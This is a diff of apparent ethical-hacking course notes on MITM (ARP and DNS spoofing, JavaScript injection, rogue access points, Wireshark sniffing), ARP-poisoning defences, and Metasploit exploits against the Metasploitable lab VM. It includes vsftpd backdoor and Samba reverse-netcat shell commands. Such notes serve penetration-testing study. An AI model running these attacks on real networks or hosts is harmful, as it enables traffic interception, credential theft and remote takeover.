@@ -253,8 +253,10 @@ $aircrack-ng output_file.cap -w wordlist.txt
 ## Information gathering
 - Discovering Devices connected to same network:
 ```
-netdisconver -r 10.0.2.1/24
+netdisconver -i [wiredinterface] -r 10.0.2.1/24
 # will discover all IPs from 10.0.2.1 to 10.0.2.254
+netdisconver -i [wirelessinterface] -r 192.168.0.1/24
+# will discover all IPs from 192.168.0.1 to 192.168.0.254
 ```
 - Network Mapping (NMap), HUGE security scanner.
 - From an IP/IP range it can discover:
@@ -301,7 +303,7 @@ any request/response to access point goes through hacker computer, can be achiev
 - Usage is always the same.
 - use:
   ```
-  # run these commands in two shells
+  #run these commands in two shells
   arpspoof -i [interface] -t [clientIP] [gatewayIP]
   arpspoof -i [interface] -t [gatewayIP] [clientIP]
   ## requests from MITM will not go to access point, it doesn't allow due to security feature,
@@ -413,7 +415,7 @@ hstshijack/hstshijack
   - https://ufile.io/joxjzflg
   - alternate added in repository
 
-## DNS Spoofing (Controlling DNS Requests on the Network)
+## DNS Spoofing (Controlling DNS Requests on the Network) - MITM
 - DNS → Domain Name System.
   - Translates domain names to IP addresses.
   - request for website goes to DNS, will in result return the IP of the server
@@ -444,4 +446,264 @@ $ dns.spoof on
   - server fake updates (check if user has new updates, we can DNS spoof them send them fake updates)
 
 
-## Injecting Javascript code
+## Injecting Javascript code (MITM)
+Inject Javascript/HTML code in loaded pages
+- Code gets executed by the target browser
+  - → use the --inject plugin
+- Code can be :
+  1. Stored in  a file --js-file or --html-file
+  2. Stored online --js-url or --html-url
+  3. Supplied through the command line --js-payload or --html-payload
+- Can be used for:
+  1. replace links
+  2. Replace images
+  3. insert html elements
+  4. Hook target browser to exploitation Framework
+  5. and more!!
+- process:
+```
+# take simple Javascript file and save as alert.js:
+  alert('Javascript test');
+# in bettercap hstshijack  caplet (custom), edit hstshijack.cap
+# set hstshijack.payload *:/root/alert.js
+@before colon is the url of webpage we want to inject our code into (astrisk means all pages)
+@after colon is the path of Javascript code
+@if more than one, add seperated with comma
+# start arp spoofing:
+$ bettercap -iface wlan0 -caplet start_spoof.cap
+# start hstshijack plugin
+```
+- limitation:
+  - works against http and https (downgraded to http) and only work with hsts when bypassed
+
+
+## wireshark Tool
+- it is network protocol analyser
+- Designed to help network administrators to keep track of what happening in their network
+- How does it works?
+  - allows you to select a network Interface
+  - logs packets that flows through that selected Interface
+  - Analyse all the packets
+- When we are the MITM, wireshark can be used to sniff & analyse traffic sent/received by targets
+- How to use:
+  - open wireshark
+  - select interface or open captured file
+- **Sniffing & Analysing data**:
+  - select the interface we're doing MITM attack
+  - in output -> you can store the packets to a file (optional)
+  - you can apply filter (ex: http)
+  - double click on a packet to open it, you can see data:
+    - protocol Used
+    - port on which data is sent
+    - source and dest mac address
+    - hypertext Transfer Protocol contains form data (in POST request : login info etc )
+  - right click a packet and : Follow > HTTP Stream --> Follow the stream and response of the request
+
+
+## Creating a Fake Access Point (Honeypot) -
+Hacker machine having any interface with internet Access (most likely via NATNetwork) and it's wireless adapter broadcasting signal in AP mode (behaving like a router): <br>
+Any device connected to it will be victim of MITM attack
+
+- **Using Mana-Toolkit** : Tools run rogue access point attacks.
+- It can:
+  - Automatically configure and create fake AP.
+  - Automatically sniff data.
+  - Automatically bypass https. ….etc
+- Mana has 3 main start scripts:
+  1. start-noupstream.sh - starts fake AP with no internet access.
+  2. start-nat-simple.sh - starts fake AP with internet access.
+  3. start-nat-full.sh - starts fake AP with internet access, and automatically starts sniffing data, bypass https.
+- install Mana : script n repo -> install_mana.sh
+- it can be done manually as well, and a lot attack can be done with Fake access point
+- preferably use : start-nat-simple.sh (sniffing can be started with bettercap separately)
+- how to setup:
+  - VM Network setting -> NATNetwork (i.e. eth0 : interface connected to internet)
+  - wireless adapter connected to VM -> wlan0 (in managed mode and not connected to internet)
+  - modify mana-Toolkit config file : leafpad /etc/mana-toolkit/hostapt-mana.conf
+    - modify interface to broadcast the signal From
+      - interface=wlan0
+    - you can modify ssid (optional)
+  - modify start script that start mana-toolkit : leafpad /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
+    - modify upstream internet (with internet access, eth0 in our case)
+      - upstream=eth0
+    - modify phy (interface that is going to broadcast signal, in our case : wireless adaptor)
+      - phy=wlan0
+  - call start mana script
+    - bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
+  - if error occur first time kill the command and run it again
+  - do not test it from host machine as Fake access point is using internet from Host machine (NATNetwork), test it from another VM or another device (ex: phone)
+
+
+## Detecting/Prevention ARP Poisoning Attacks:
+ - run command: arp -a
+  - check if some other device in your network has same mac address as your router
+ - use  tool  to detect : http://www.xarp.net/#download
+ - **Using wireshark to detect suspicious activities in network**
+  - wireshark -> preference -> protocols -> arp/rarp -> enable detect ARP request storms
+  - give the device which is trying to discover all the device in the network and give notification
+  - to verify : run command from another device : netdisconver
+  - you can check result at : wireshark -> analyse -> Expert Information
+- Prevention: Encrypt data :
+  - Use HTTPS Everywhere plugin : convert all request to https (request domain should support https as well)
+    - limitation:
+      - do nothing for website that do not support HTTPS
+      - visit domains still visible
+      - DNS spoofing still possible
+  - Use VPN
+    - create a encrypted tunnel between your device and server
+    - request first goes to VPN server first and then to requested webserver
+    - VPN server can read all your data, so take VPN provider carefully (avoid free providers)
+    - make sure VPN provider keep no logs
+    - HTTPS Everywhere plugin can be used with VPN (VPN provider can not see data over HTTPS)
+
+# Gaining Access to Computer devices
+any electronic device <br>
+**Server Side Attacks**
+- Do not require user interaction, all we need is a target IP
+- starts with information gathering, find open ports, installed services and work from there
+- mostly applies to webserver, application and device that are not get used much by users
+**Client Side Attacks**
+- Require user interaction, such as opening a file, a links
+- information gathering is key here, create a trojan and use social engineering to get the target to run it
+**Post exploitation**
+- what can be done after gaining Access
+
+# Gaining Access - Server Side Attacks
+
+## Installing Metasploitable as a Virtual Machine
+- this machine will act as a server (victim that we will attack)
+- Metasploitable is a vulnerable linux distro, this OS contains a number of vulnerabilities
+- it is designed for penetrators to try and hack it
+- download page: https://information.rapid7.com/download-metasploitable-download.html
+- Steps:
+  - extract zip
+  - add new VM in Virtual box -> linux : ubuntu64
+  - at choosing hard disk -> use an existing virtual hard disk file -> *choose .vmdk file*
+  - username : msfadmin
+  - password : msfadmin
+  - to shoutdown -> sudo poweroff
+- run metasploitable webserver in same network with it's IP address
+
+## Introduction : Server side Attacks
+- Need an IP address.
+- Very simple if target is on the same network (netdiscover or zenmap).
+- If target has a domain, then a simple ping will return its IP.
+  - > ping www.facebook.com
+- Getting the IP is tricker if the target is a personal computer, might be useless if the target is accessing the internet through a network as the IP will be the router IP and not the targets,
+  - client side attacks are more effective in this case as reverse connection can be used.
+- **Information Gathering**:
+  - Try default password (ssh iPad case).
+  - Services might be mis-configured, such as the “r” service. Ports 512, 513, 514
+    - ports with anonymous FTP login can be accessed without user credentials
+  - Some might even contain a back door!
+    - using zenmap list all services and google the vulnerabilities of program's version online
+    - search if installed version have known exploits or backdoors
+  - Code execution vulnerabilities.
+    - https://rapid7.com is who make metasploitable, it has a lot of vulnerabilities/backdoors list
+    - ex: vsftpd v2.3.4 backdoor command execution
+
+## Server Side Attack - METASPLOIT
+Metasploit is an exploit development and execution tool. It can also be used
+to carry out other penetration testing tasks such as port scans, service
+identification and post exploitation tasks.
+```
+ > msfconsole - runs the metasploit console
+ > help - shows help
+ > show [something] - something can be exploits, payloads, auxiliaries or options.
+ > use [something] - use a certain exploit, payload or auxiliary.
+ > set [option] [value] - configure [option] to have a value of [value]
+ > exploit - runs the current task
+```
+- example:
+```
+# we went to zenmap, found the service vsftpd v2.3.4 and googled it
+# we found a vulnerability at rapid7.com as :
+## VSFTPD V2.3.4 BACKDOOR COMMAND EXECUTION
+## MODULE NAME : exploit/unix/ftp/vsftpd_234_backdoor
+# now run msfconsole
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit(vsftpd_234_backdoor) > show options
+msf exploit(vsftpd_234_backdoor) > set RHOST IP_ADDR_TARGET_MACHINE
+msf exploit(vsftpd_234_backdoor) > show options
+msf exploit(vsftpd_234_backdoor) > exploit
+## last command will run the exploit (if nothing happened, run it again)
+## now you're in target machine console, verify with:
+> uname -a
+```
+- RHOST is usually target machine, from where the connection is coming From
+- LHOST is usually hacker machine, to where the request is transferred
+- Payloads are small piece of code that are executed on target machine once the vulnerability is exploited, payload will further do something to do something like gaining control
+- **payload example**: for samba 3.x exploit ->
+- SAMBA "USERNAME MAP SCRIPT" COMMAND EXECUTION
+```
+msf > use exploit/multi/samba/usermap_script
+msf exploit(usermap_script) > show options
+msf exploit(usermap_script) > set RHOST IP_ADDR_TARGET_MACHINE
+msf exploit(usermap_script) > show payloads        -------> show list of payloads
+msf exploit(usermap_script) > set PAYLOAD cmd/unix/reverse_netcat
+msf exploit(usermap_script) > show options
+msf exploit(usermap_script) > set LHOST IP_ADDR_HACKER_MACHINE      -----> listening address
+msf exploit(usermap_script) > set LPORT PORT_HACKER_MACHINE      -----> listening port
+msf exploit(usermap_script) > show options
+msf exploit(usermap_script) > exploit
+```
+- bind payload, open a port on target computer and we connect to that port
+- reverse payload, do opposite, open port on hacker machine and connect from target machine to hacker machine (allow us to bypass firewall, as connection going outside from target machine)
+- LPORT PORT_HACKER_MACHINE can be set to 80 or 8080, never filtered by firewall as this port is used by webservers
+
+## Server Side Attack - Metasploit community
+Metasploit community is a GUI that can discover open ports and installed
+services on the target machine, not only that but it maps these services
+to metasploit modules and exploits and allow us to run these modules
+from the web GUI.
+- steps:
+  1. Download it from https://www.rapid7.com/products/metasploit/metasploit-community-registration.jsp
+  2. Change permissions to executable. > chmod +x [installer file name]
+  3. Run installer > ./[installer file name]
+  4. Once complete, metasploit community can be started as a service.
+  ```
+   > service metasploit start
+  ```
+  5. Now navigate to https://localhost:3790 and enter your product key.
+
+## Server Side Attacks - Nexpose
+Nexpose is a vulnerability management framework,
+- it allows us to discover, assess and act on discovered vulnerabilities,
+- it also tells us a lot of info about the discovered vulnerabilities, weather they are exploitable
+- and helps us write a report at the end of the assessment.
+- might not work on kali 3 (nexpose-rolling-hack.txt attached in the repository)
+- steps:
+  1. Download it from http://www.rapid7.com/products/nexpose/compare-downloads.jsp
+  2. Stop postgresql > service postgresql stop
+  3. Change permissions to executable. > chmod +x [installer file name]
+  4. Run installer > ./[installer file name]
+  5. enter valid email, key will be sent to it. username and password will be used to login
+
+## Nexpose : Scanning a target server for vulnerabilities
+- make sure database comes with kali linux if stopped. because nexpose use its own database and both running on same port might conflict
+  - service postgresql stop
+- go to nexpose directory:
+  - cd /opt/rapid7/nexpose/
+- run nexpose: -----> (running it for first time might take time as it will do some configuration)
+  - ./nsc.sh              
+- go to url:
+  - https://localhost:3780/
+- login with username and password
+- Enter the product key sent to your email address
+- Creating a project:
+  - Create > Site
+  - give NAME
+  - **go to asset** and give TARGET in *assets field*
+  - **go to authentication** if target require any type of authentication
+  - **go to template** : try different profiles
+    - web-spider: finds all files and directories
+  - save and start scan
+- result analysis:
+  - shows malware, exploits and vulnerabilities
+  - show software installed
+  - show installed Services
+  - on clicking any service, it will give detailed result
+  - vulnerability page show categorized list of vulnerabilities
+    - you can sort based on risk factor
+  - shoes solutions to fix
+  - different level of reports can be generated
